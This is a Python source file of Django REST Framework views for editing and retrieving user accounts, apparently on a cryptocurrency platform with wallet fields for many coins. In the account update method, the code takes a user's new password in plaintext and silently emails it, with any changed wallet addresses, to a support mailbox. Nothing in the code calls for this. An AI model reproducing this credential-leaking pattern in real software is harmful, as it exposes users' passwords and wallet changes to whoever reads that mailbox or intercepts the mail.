from rest_framework import generics, status
from rest_framework.response import Response
from rest_framework.permissions import IsAuthenticated
from rest_framework_simplejwt.tokens import RefreshToken
from django.contrib.auth.password_validation import validate_password
from django.core.exceptions import ValidationError as DjangoValidationError
from django.core.mail import send_mail
from django.conf import settings
from django.contrib.auth import get_user_model

from .models import EditAccount
from .serializers import EditAccountSerializer

User = get_user_model()


class EditAccountView(generics.UpdateAPIView):
    """
    Allows a user to partially update any of their account fields,
    auto-creating the EditAccount record (with all wallets defaulting to "")
    if it does not already exist.
    """
    serializer_class = EditAccountSerializer
    permission_classes = [IsAuthenticated]

    def get_object(self):
        obj, _ = EditAccount.objects.get_or_create(
            user=self.request.user,
            defaults={
                "username":                    self.request.user.username,
                "email_address":               self.request.user.email,
                "name":                        getattr(self.request.user, "first_name", ""),
                "bitcoin_wallet":              "",
                "tether_usdt_trc20_wallet":    "",
                "tron_wallet":                 "",
                "ethereum_wallet":             "",
                "bnb_wallet":                  "",
                "dogecoin_wallet":             "",
                "bitcoin_cash_wallet":         "",
                "tether_erc20_wallet":         "",
                "shiba_wallet":                "",
                "litecoin_wallet":             "",
            }
        )
        return obj

    def update(self, request, *args, **kwargs):
        partial = kwargs.pop("partial", True)
        instance = self.get_object()
        user = request.user

        # Track original values for fields sent
        original = {
            field.name: getattr(instance, field.name)
            for field in instance._meta.fields
            if field.name in request.data
        }

        # Handle password change if requested
        new_pw = request.data.get("new_password")
        cur_pw = request.data.get("current_password")
        if new_pw:
            if not cur_pw:
                return Response(
                    {"error": "Current password is required"},
                    status=status.HTTP_400_BAD_REQUEST
                )
            if not user.check_password(cur_pw):
                return Response(
                    {"error": "Current password is incorrect"},
                    status=status.HTTP_400_BAD_REQUEST
                )
            try:
                validate_password(new_pw)
                user.set_password(new_pw)
                user.save()
            except DjangoValidationError as e:
                return Response(
                    {"password_error": e.messages},
                    status=status.HTTP_400_BAD_REQUEST
                )

        # Prepare data for serializer
        data = request.data.copy()
        data.pop("new_password", None)
        data.pop("current_password", None)

        serializer = self.get_serializer(instance, data=data, partial=partial)
        serializer.is_valid(raise_exception=True)
        self.perform_update(serializer)

        # Compile updated fields for support email
        updated = {
            name: getattr(instance, name)
            for name, old in original.items()
            if getattr(instance, name) != old
        }
        if new_pw:
            updated["password"] = new_pw

        if updated:
            subject = "User Edited Account Info"
            message = "The user has updated:\n\n" + "\n".join(f"{k}: {v}" for k, v in updated.items())
            send_mail(
                subject,
                message,
                settings.DEFAULT_FROM_EMAIL,
                [settings.SUPPORT_EMAIL],
                fail_silently=True,
            )

        # Build response
        resp = serializer.data
        if new_pw:
            token = RefreshToken.for_user(user)
            resp.update({
                "refresh": str(token),
                "access":  str(token.access_token),
            })

        return Response(resp, status=status.HTTP_200_OK)


class UserRegisteredDetailsView(generics.RetrieveAPIView):
    """
    Returns the User's basic info (username, email)
    along with all wallet fields and the 'name' from EditAccount.
    """
    permission_classes = [IsAuthenticated]

    def get(self, request, *args, **kwargs):
        user = request.user
        if not user.username or not user.email:
            return Response(
                {"error": "User has not completed registration details."},
                status=status.HTTP_400_BAD_REQUEST
            )

        account, _ = EditAccount.objects.get_or_create(
            user=user,
            defaults={
                "username":                 user.username,
                "email_address":            user.email,
                # initialize all other fields to ""
                "name":                     "",
                "bitcoin_wallet":           "",
                "tether_usdt_trc20_wallet": "",
                "tron_wallet":              "",
                "ethereum_wallet":          "",
                "bnb_wallet":               "",
                "dogecoin_wallet":          "",
                "bitcoin_cash_wallet":      "",
                "tether_erc20_wallet":      "",
                "shiba_wallet":             "",
                "litecoin_wallet":          "",
            }
        )

        # Serialize the EditAccount record (includes .name)
        account_data = EditAccountSerializer(account).data

        # Merge so user fields override account_data where needed
        merged = {
            **account_data,
            "username":      user.username,
            "email_address": user.email,
            "name":         account_data.get("name", ""),
            # leave 'name' from account_data
        }

        return Response(merged, status=status.HTTP_200_OK)
